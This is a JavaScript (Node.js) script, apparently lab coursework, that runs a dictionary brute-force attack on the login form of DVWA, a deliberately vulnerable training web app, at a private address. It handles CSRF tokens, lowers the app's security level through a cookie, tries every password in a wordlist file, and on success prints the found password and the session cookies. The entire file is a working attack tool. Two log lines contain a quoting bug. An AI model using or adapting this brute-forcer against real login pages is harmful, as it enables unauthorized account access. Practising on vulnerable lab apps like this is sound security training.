const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const readline = require('readline');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

const SecurityLevel = {
  LOW: 'low',
  MEDIUM: 'medium',
  HIGH: 'high',
  IMPOSSIBLE: 'impossible'
};

class CSRFManager {
  static async getToken(session, url) {
    try {
      const response = await session.get(url);
      const $ = cheerio.load(response.data);
      return $('input[name="user_token"]').attr('value') || null;
    } catch (error) {
      console.error('Fehler beim Abrufen des CSRF-Tokens:', error);
      return null;
    }
  }
}

class DVWASessionProxy {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.loginUrl = `${baseUrl}/login.php`;
    this.data = {};
    this.loginData = {
      username: 'admin',
      password: 'password',
      Login: 'Login'
    };
    this.jar = new CookieJar();
    this.session = wrapper(axios.create({
      jar: this.jar,
      withCredentials: true
    }));
  }

  async setSecurity(securityLevel) {
    await this.jar.setCookie(`security=${securityLevel}`, this.baseUrl);
  }

  async login(password) {
    const token = await CSRFManager.getToken(this.session, this.loginUrl);
    if (token) this.data.user_token = token;
    const postData = { ...this.loginData, ...this.data, password: password };
    try {
      const response = await this.session.post(this.loginUrl, new URLSearchParams(postData).toString(), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });
      return response;
    } catch (error) {
      console.error('Fehler beim Login:', error);
      return null;
    }
  }

  async get(url, options = {}) {
    try {
      const response = await this.session.get(url, options);
      return response;
    } catch (error) {
      console.error('GET-Fehler:', error);
      return null;
    }
  }
}

function getCookieString(jar, url) {
  return new Promise((resolve, reject) => {
    jar.getCookieString(url, (err, cookies) => {
      if (err) reject(err);
      else resolve(cookies);
    });
  });
}

async function bruteForce(sessionProxy, passwordFile) {
  console.log("Starte Brute-Force-Angriff...");
  const fileStream = fs.createReadStream(passwordFile, { encoding: 'utf-8' });
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
  for await (const line of rl) {
    const pwd = line.trim();
    if (!pwd) continue;
    console.log("Versuche Passwort: ${pwd}");
    const response = await sessionProxy.login(pwd);
    if (!response) {
      console.log("Keine Antwort erhalten.");
      continue;
    }
    const $ = cheerio.load(response.data);
    const title = $('title').text().trim();
    const logoutLink = $('a[href*="logout.php"]');
    if (logoutLink.length > 0 || !title.startsWith("Login ::")) {
      console.log("Erfolg! Passwort gefunden: ${pwd}");
      const cookieString = await getCookieString(sessionProxy.jar, sessionProxy.baseUrl);
      console.log("Session Cookies:", cookieString);
      return pwd;
    } else {
      console.log(`Passwort ${pwd} führte nicht zu einem erfolgreichen Login.`);
    }
  }
  console.log("Kein gültiges Passwort gefunden.");
  return null;
}

async function main() {
  const baseUrl = "http://10.115.2.4:4280";
  const passwordFile = "C:/Users/marti/Coding/BDDA/SSED/Hydra/password.txt";
  const dvwa = new DVWASessionProxy(baseUrl);
  await dvwa.setSecurity(SecurityLevel.LOW);
  const foundPassword = await bruteForce(dvwa, passwordFile);
  if (foundPassword) {
    console.log("\nBrute-Force-Angriff erfolgreich!");
    console.log(`Das korrekte Passwort lautet: ${foundPassword}`);
  } else {
    console.log("\nBrute-Force-Angriff fehlgeschlagen: Es wurde kein gültiges Passwort gefunden.");
  }
}

main().catch(err => {
  console.error("Fehler im Hauptprogramm:", err);
}); 